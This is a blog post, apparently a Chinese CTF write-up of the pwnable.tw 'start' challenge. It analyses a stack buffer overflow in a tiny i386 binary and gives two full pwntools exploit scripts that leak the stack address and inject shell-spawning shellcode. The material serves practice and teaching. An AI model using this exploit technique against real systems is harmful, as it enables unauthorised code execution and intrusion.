@@ -1,0 +1,295 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Writeup of pwnable.tw之start | P1AIN0&#39;S BLOG</title>
+  
+  
+  <meta name="description" content="题目地址：pwable.tw
+使用checksec查看开启了哪些防护措施：
+123456Arch:     i386-32-littleRELRO:    No RELROStack:    No canary foundNX:       NX disabledPIE:      No PIE (">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Writeup of pwnable.tw之start"/>
+  <meta property="og:site_name" content="P1AIN0&#39;S BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/blog/atom.xml" title="P1AIN0&#39;S BLOG" type="application/atom+xml">
+  
+  
+    <link href="/blog/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/blog/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/blog/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/blog/">P1AIN0&#39;S BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/blog/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Writeup of pwnable.tw之start</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>题目地址：pwable.tw</p>
+<p>使用checksec查看开启了哪些防护措施：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用objdump -d进行反汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:    54                       push   %esp</span><br><span class="line"> 8048061:    68 9d 80 04 08           push   $0x804809d</span><br><span class="line"> 8048066:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 8048068:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 804806a:    31 c9                    xor    %ecx,%ecx</span><br><span class="line"> 804806c:    31 d2                    xor    %edx,%edx</span><br><span class="line"> 804806e:    68 43 54 46 3a           push   $0x3a465443</span><br><span class="line"> 8048073:    68 74 68 65 20           push   $0x20656874</span><br><span class="line"> 8048078:    68 61 72 74 20           push   $0x20747261</span><br><span class="line"> 804807d:    68 73 20 73 74           push   $0x74732073</span><br><span class="line"> 8048082:    68 4c 65 74 27           push   $0x2774654c //将要显示的字符串压栈</span><br><span class="line"> 8048087:    89 e1                    mov    %esp,%ecx</span><br><span class="line"> 8048089:    b2 14                    mov    $0x14,%dl</span><br><span class="line"> 804808b:    b3 01                    mov    $0x1,%bl</span><br><span class="line"> 804808d:    b0 04                    mov    $0x4,%al</span><br><span class="line"> 804808f:    cd 80                    int    $0x80</span><br><span class="line"> 8048091:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 8048093:    b2 3c                    mov    $0x3c,%dl</span><br><span class="line"> 8048095:    b0 03                    mov    $0x3,%al</span><br><span class="line"> 8048097:    cd 80                    int    $0x80</span><br><span class="line"> 8048099:    83 c4 14                 add    $0x14,%esp</span><br><span class="line"> 804809c:    c3                       ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:    5c                       pop    %esp</span><br><span class="line"> 804809e:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 80480a0:    40                       inc    %eax</span><br><span class="line"> 80480a1:    cd 80                    int    $0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p>
+<p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p>
+<p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p>
+<p> 8048060:    54                       push   %esp</p>
+<p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p>
+<p>具体思路如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)                  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       jmp esp&#x27;&#x27;&#x27;</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或这样：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       ret&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span>-<span class="number">0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/blog/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/" class="leancloud-visitors view" data-flag-title="Writeup of pwnable.tw之start">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/blog/2020/03/21/Writeup-of-pwnable-tw之orw/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/blog/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/blog/2020/03/16/模式匹配算法/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-03-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/blog/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 P1AIN0&#39;S BLOG
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/blog/js/jquery.imagesloaded.min.js"></script>
+<script src="/blog/js/gallery.js"></script>
+<script src="/blog/js/bootstrap.min.js"></script>
+<script src="/blog/js/main.js"></script>
+<script src="/blog/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
